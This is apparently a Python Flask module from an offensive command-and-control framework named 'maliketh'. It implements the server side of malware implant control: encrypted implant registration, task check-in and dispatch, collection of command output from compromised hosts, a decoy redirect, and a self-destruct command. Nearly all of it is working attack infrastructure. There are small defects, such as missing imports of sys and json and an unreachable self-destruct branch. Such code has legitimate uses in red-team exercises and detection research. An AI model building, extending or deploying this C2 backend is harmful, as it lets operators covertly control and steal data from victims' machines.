from datetime import datetime
from typing import Callable, Dict, Optional, Union, cast
from flask import Blueprint, jsonify, make_response, redirect, request
from maliketh.db import db
from maliketh.operator.rmq import send_message_to_all_queues, send_message_to_operator
from maliketh.models import *
from functools import wraps
from maliketh.config import C2_PROFILE
from maliketh.crypto.ec import (
    generate_ecc_keypair,
    encrypt,
    load_pubkey,
    load_privkey,
    decrypt_b64,
)
from maliketh.logging.standard_logger import StandardLogger, LogLevel
from nacl.encoding import Base64Encoder
import nacl.secret
import base64

logger = StandardLogger(sys.stdout, sys.stderr, LogLevel.INFO)
c2 = Blueprint("c2", __name__, url_prefix=C2_PROFILE.routes.base_path)


def implant_authenticated(func: Callable):
    """
    Check if the implant is authenticated. If so, set the request's body as the decrypted data.
    Does not apply to the registration endpoint.
    """

    @wraps(func)
    def wrapper(*args, **kwargs):
        if request.endpoint == C2_PROFILE.routes.register.path:
            return

        imp_id = request.cookies.get(C2_PROFILE.globals.implant_id_cookie)
        if imp_id is None:
            return "Unauthorized", 401

        implant = Implant.query.filter_by(implant_id=imp_id).first()
        if implant is None:
            return "Unauthorized", 401

    
        if request.get_data():
            try:
                raw_decrypted = decrypt_b64(
                implant.implant_pk, implant.server_sk, request.get_data()
            )
                decrypted = json.loads(raw_decrypted)
            except Exception as e:
                logger.error(f"Failed to decrypt request body: {e}: {request.get_data()}")
                return "Failed to decrypt", 401
            return func(*args, **kwargs, decrypted_body=decrypted)
        else:
            return func(*args, **kwargs)

       

    return wrapper


@c2.route("/")
def hello_c2():
    return redirect(C2_PROFILE.server_profile.redirect_url)


@c2.route(C2_PROFILE.routes.register.path, methods=C2_PROFILE.routes.register.methods)
def register():
    # /register
    # Read implant public key from body
    # txid is encrypted and base64 encoded with the value in `registration_password`
    
    """
    {
        "txid": "b64_key_here",
    }
    """

    if request.json is None or request.json.get("txid") is None:
        return "Unauthorized", 401

    logger.error(request.json)

    # Get the (encrypted) implant public key
    implant_public_key_b64_encrypted = request.json["txid"]

    # Decrypt the implant public key
    try:
        key = base64.b64decode(C2_PROFILE.globals.registration_password)
        box = nacl.secret.SecretBox(key)
        implant_public_key_b64 = box.decrypt(implant_public_key_b64_encrypted, encoder=Base64Encoder).decode("utf-8")
        # Remove all null bytes
        implant_public_key_b64 = implant_public_key_b64.replace("\0", "")
    except Exception as e:
        logger.error(f"{e}")
        logger.error(f"Failed to decrypt implant public key: {implant_public_key_b64_encrypted}")
        return "Unauthorized", 401


    # Check if it's base64
    try:
        base64.b64decode(implant_public_key_b64)
        implant_public_key = load_pubkey(implant_public_key_b64)
    except Exception as e:
        logger.error(f"{e}")
        logger.error(f"Failed to load implant public key: {implant_public_key_b64}")
        return "Unauthorized", 401

    # Check if the implant is already registered (via public key)
    if Implant.query.filter_by(implant_pk=implant_public_key_b64).first() is not None:
        return "Unauthorized", 401

    sk, pk = generate_ecc_keypair()  # Each implant will have a unique server public key
    sk_b64 = sk.encode(encoder=Base64Encoder).decode("utf-8")
    pk_b64 = pk.encode(encoder=Base64Encoder).decode("utf-8")

    # Create a new implant and add it to the db
    implant = Implant(
        implant_id=random_id(n=8),
        hostname=request.host,
        ip=request.remote_addr,
        os=request.user_agent.platform,
        arch=request.user_agent.platform,
        user="",
        server_sk=sk_b64,
        implant_pk=implant_public_key_b64,
        created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    )

    # Create default config
    config = ImplantConfig.from_profile(C2_PROFILE, implant.implant_id, pk_b64)

    db.session.add(implant)
    db.session.add(config)
    db.session.commit()

    send_message_to_all_queues(f"New implant registered: {implant.implant_id}")

    resp_body = json.dumps(
        {
            "status": True,
            "id": implant.implant_id,
            "config": config.toJSON(),
        }
    ).encode("utf-8")
    resp_body = encrypt(implant_public_key, sk, resp_body)

    resp = jsonify(
        {
            "status": True,
            "k": pk_b64,
            "c": resp_body.decode("utf-8"),
        }
    )
    resp.status_code = 200

    # Set cookie to implant ID
    resp.set_cookie(C2_PROFILE.globals.implant_id_cookie, implant.implant_id)

    return resp


@c2.route(C2_PROFILE.routes.checkin.path, methods=C2_PROFILE.routes.checkin.methods)  # type: ignore
@implant_authenticated
def get_task():
    # Get implant id from cookie
    implant_id = request.cookies.get(C2_PROFILE.globals.implant_id_cookie)

    if implant_id is None:
        return "Not Found", 404

    # Check if implant ID exists, if not, throw 404
    if get_implant_by_id(implant_id) is None:
        return "Not Found", 404

    # Get task from db
    task = get_oldest_task_for_implant(implant_id)

    # If task is not None, return task
    if task is not None:
        # Set the task as read
        task.read_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        task.status = TASKED
        db.session.commit()
        encryptedResponse = encrypt(
            load_pubkey(get_implant_by_id(implant_id).implant_pk),
            load_privkey(get_implant_by_id(implant_id).server_sk),
            task.to_filtered_json().encode("utf-8"),
        )
        return encryptedResponse

    # If the task was a SELFDESTRUCT, delete the implant
    if task is not None and task.command == "SELFDESTRUCT":
        # Delete the implant
        to_delete = Implant.query.filter_by(implant_id=implant_id).first()
        if to_delete is None:
            encryptedResponse = encrypt(
                load_pubkey(get_implant_by_id(implant_id).implant_pk),
                load_privkey(get_implant_by_id(implant_id).server_sk),
                json.dumps({"status": False, "msg": "Unknown implant"}).encode("utf-8"),
            ) 
            #jsonify({"status": False, "msg": "Unknown implant"})
            return encryptedResponse, 400
        db.session.delete(to_delete)
        db.session.commit()

    # If task is None, return empty task
    encryptedResponse = encrypt(
        load_pubkey(get_implant_by_id(implant_id).implant_pk),
        load_privkey(get_implant_by_id(implant_id).server_sk),
        json.dumps({}).encode("utf-8"),
    )
    return encryptedResponse


@c2.route(C2_PROFILE.routes.task_results.path, methods=C2_PROFILE.routes.task_results.methods)  # type: ignore
@implant_authenticated
def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
    """
    Get the output of a task and mark it as completed.
    """
    if decrypted_body is None:
        return "Unauthorized", 401

    if not verify_post_task_body(decrypted_body):
        return "Unauthorized", 401

    # Get implant id from cookie
    implant_id = request.cookies.get(C2_PROFILE.globals.implant_id_cookie)

    if implant_id is None:
        return "Unauthorized", 404

    tid = cast(str, decrypted_body["tid"])

    # Check if implant ID exists, if not, throw 404
    implant = get_implant_by_id(implant_id)
    if implant is None:
        return "Not Found", 401

    implant.last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get task from db
    task = get_task_by_id(tid)
    # If task is not None, return task
    if task is not None:
        if task.status != TASKED:
            print("Task is not tasked, possible replay attack")
            return "Unauthorized", 401

        if decrypted_body["status"]:
            task.status = COMPLETE
            task.output = decrypted_body["output"]
        else:
            task.status = ERROR
            task.output = decrypted_body["output"]

        task.executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        db.session.commit()

        op = Operator.query.filter_by(username=task.operator_name).first()
        send_message_to_operator(op, f"Task {task.task_id} completed - {task.status}")
        if task.status == ERROR:
            send_message_to_operator(op, f"Task {task.task_id} error output - {base64.b64decode(task.output).decode('utf-8')}")

        return "OK"
    # If task is None, return empty task
    return "Not Found", 404


def verify_post_task_body(body: Dict[str, Union[str, bool]]) -> bool:
    """
    Verify that the body of the post_task request is valid.
    """

    if len(set(["status", "tid", "output"]).intersection(set(body.keys()))) != 3:
        return False

    if type(body["status"]) != bool:
        return False

    if type(body["tid"]) != str:
        return False

    if type(body["output"]) != str:
        return False
    return True
